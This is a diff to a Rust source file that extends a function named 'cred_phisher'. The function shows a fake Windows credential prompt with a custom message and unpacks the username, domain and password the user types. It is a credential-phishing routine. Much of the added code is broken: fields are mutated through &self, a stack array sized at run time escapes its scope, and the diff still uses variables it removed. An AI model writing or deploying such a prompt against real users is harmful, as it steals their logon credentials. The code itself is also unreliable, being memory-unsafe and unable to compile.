@@ -7,6 +7,7 @@ use winapi::um::wincred::{CredUIPromptForWindowsCredentialsW,CredUnPackAuthentic
 use winapi::um::combaseapi::{CoTaskMemFree};
 use winapi::shared::windef::{HWND,HBITMAP};
 use winapi::shared::minwindef::{DWORD,ULONG,LPVOID,BOOL,FALSE,TRUE};
+use winapi::um::errhandlingapi::{GetLastError,SetLastError};
 
 use super::wchar_windows::str_to_c_wstr;
 
@@ -19,6 +20,66 @@ pub struct NetworkCredentials {
 	pub Username :String,
 	pub Password :String,
 	pub Domain :String,
+}
+
+struct CoMemData {
+	outbuf :LPVOID,
+	outsize : ULONG,
+}
+
+impl CoMemData {
+	fn new() -> CoMemData {
+		CoMemData {
+			outbuf : std::ptr::null_mut(),
+			outsize : 0,
+		}
+	}
+}
+
+impl Drop for CoMemData {
+	fn drop(&self) {
+		if self.outbuf != std::ptr::null() {
+			CoTaskMemFree(self.outbuf);
+			self.outbuf = std::ptr::null_mut();
+		}
+		self.outsize = 0;
+	}
+}
+
+struct WStrBuf {
+	buffer :LPWSTR,
+	bufsize : DWORD,
+}
+
+impl WStrBuf {
+	fn new() -> WStrBuf {
+		WStrBuf {
+			buffer : std::ptr::null(),
+			bufsize : 0,
+		}
+	}
+
+	fn realloc(&self,size :DWORD) {
+		if self.buffer != std::ptr::null() {
+			std::ptr::drop_in_place(self.buffer.as_ptr());
+		}
+		self.buffer = std::ptr::null();
+		let arr :[std::mem::MaybeUninit<u16>;size] = unsafe{ std::mem::MaybeUninit::uninit().assume_init() };
+		self.buffer = arr.as_ptr();
+		self.bufsize = size;
+		return;
+	}
+}
+
+impl Drop for WStrBuf {
+	fn drop(&self) {
+		if self.buffer != std::ptr::null() {
+			std::ptr::drop_in_place(self.buffer.as_ptr());
+		}
+		self.buffer = std::ptr::null();
+		self.bufsize = 0;
+		return;
+	}
 }
 
 pub fn cred_phisher( msg :&str) -> Result<NetworkCredentials,Box<dyn Error>> {
@@ -48,19 +109,42 @@ pub fn cred_phisher( msg :&str) -> Result<NetworkCredentials,Box<dyn Error>> {
 	};
 	let mut authpackage : ULONG = 0;
 	let dret :DWORD ;
-	let mut outbuffer :LPVOID = std::ptr::null_mut();
-	let mut outbufsize : ULONG = 0;
+	let mut outcomem :CoMemData = CoMemData::new();
 	let mut save :BOOL = FALSE;
 	let mut bret :BOOL;
 
+	let mut userbuf :WStrBuf = WStrBuf::new();
+	let mut domainbuf :WStrBuf = WStrBuf::new();
+	let mut passbuf :WStrBuf = WStrBuf::new();
+	let mut usersize :DWORD;
+	let mut domainsize :DWORD;
+	let mut passsize :DWORD;
+	let mut errcode :DWORD;
+
+	userbuf.realloc(1);
+	domainbuf.realloc(1);
+	passbuf.realloc(1);
+
 	unsafe {
 		dret = CredUIPromptForWindowsCredentialsW(&mut credui,0,&mut authpackage,
-				std::ptr::null(),0,&mut outbuffer,&mut outbufsize,&mut save,1);
+				std::ptr::null(),0,&mut outcomem.outbuf,&mut outcomem.outsize,&mut save,1);
 		if dret != 0 {
 			extargs_new_error!{CredLibError,"can not CredUIPromptForWindowsCredentialsW error [{}]", dret}
 		}
 
-		bret = CredUnPackAuthenticationBufferW(0,outbuffer,outbufsize,);
+		usersize = userbuf.bufsize;
+		domainsize = domainbuf.bufsize;
+		passsize = passbuf.bufsize;
+
+		SetLastError(0);
+		bret = CredUnPackAuthenticationBufferW(0,outbuffer,outbufsize,
+			userbuf.buffer,&mut usersize,
+			domainbuf.buffer,&mut domainsize,
+			passbuf.buffer,&mut passsize);
+		if bret == FALSE {
+			errcode = GetLastError();
+			extargs_new_error!{CredLibError,"can not CredUnPackAuthenticationBufferW  {}",errcode}
+		}
 	}
 
 	let retv = NetworkCredentials{
